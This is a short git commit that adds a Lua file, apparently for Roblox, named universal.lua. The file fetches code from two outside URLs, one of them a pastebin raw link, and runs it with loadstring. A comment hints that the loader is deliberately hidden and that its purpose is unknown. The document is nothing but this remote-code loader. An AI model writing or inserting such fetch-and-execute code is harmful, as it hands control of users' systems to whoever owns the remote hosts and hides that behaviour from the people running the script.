a6a538a6f226758a31647ab9380f2fd0b742f486
kiel <melonwateur@protonmail.com>
2025-11-25 11:55:30 +0800

    Add script to load external Lua code

---
+++ universal.lua
@@ -0,0 +1,6 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://x64.my/luau"))() -- quite hidden in plain sight :smirk: i wonder what it does though :think:
+end)
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/XJBYdYMq"))() 
+end)
